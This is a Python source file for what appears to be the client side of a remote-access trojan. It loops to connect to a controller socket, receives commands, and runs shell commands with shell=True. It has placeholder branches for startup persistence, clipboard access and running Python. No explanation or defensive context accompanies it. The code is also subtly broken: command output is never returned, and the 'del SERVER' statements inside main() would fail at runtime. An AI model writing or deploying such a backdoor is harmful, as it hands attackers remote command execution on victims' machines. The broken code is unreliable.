import socket
import subprocess
import os
import sys
from time import sleep

BUFF_SIZE = 64
ADDRESS = socket.gethostbyname(socket.gethostname())
PORT = 5050
FORMAT = "utf-8"
SERVER = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


def main():
    while True:
        # Connect to server
        connect_to_server()

        while True:
            try:
                # Receive command
                command = receive()

                if command == "exit":
                    sys.exit()

                elif command == "cmd":
                    shell_command()

                elif command == "startup":
                    pass

                elif command == "clipboard":
                    pass

                elif command == "python":
                    pass

            except socket.error as e:
                del SERVER
                break


def shell_command():
    send(os.getcwd() + ">>")
    command = receive()
    output = subprocess.check_output(command, shell=True)


def connect_to_server():
    while True:
        try:
            SERVER.connect((ADDRESS, PORT))
        except ConnectionRefusedError:
            # Try to connect again
            sleep(2)
            continue
        # break if connected
        break

def receive():
    size = SERVER.recv(BUFF_SIZE)
    msg = SERVER.recv(int(size.decode()))
    return msg.decode()

def send(msg):
    msg_len = str(len(msg)).encode()
    msg_len += b' ' *(BUFF_SIZE - len(msg_len))
    SERVER.send(msg_len)
    sleep(0.1)
    SERVER.send(msg.encode())

if __name__ == '__main__':
    while True:
        main()
        del SERVER